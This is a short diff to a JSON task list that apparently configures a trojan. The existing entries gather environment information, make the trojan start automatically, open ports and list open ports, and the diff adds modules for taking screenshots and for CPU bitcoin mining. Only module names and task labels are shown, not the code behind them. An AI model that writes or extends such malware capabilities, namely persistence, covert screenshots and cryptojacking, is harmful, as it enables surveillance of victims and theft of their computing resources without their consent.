@@ -3,5 +3,7 @@
     {"module": "environment.py", "task": "gather_info"},
     {"module": "autostart.py", "task": "make_trojan_auto_start"},
     {"module": "port_opener.py", "task": "opens_ports"},
-    {"module": "openportslister.py", "task": "shows_open_ports"}
+    {"module": "openportslister.py", "task": "shows_open_ports"},
+    {"module": "screenshot.py", "task": "takes_screenshots"},
+    {"module": "btcminer.py", "task": "starts_cpu_mining_btc"}
 ]
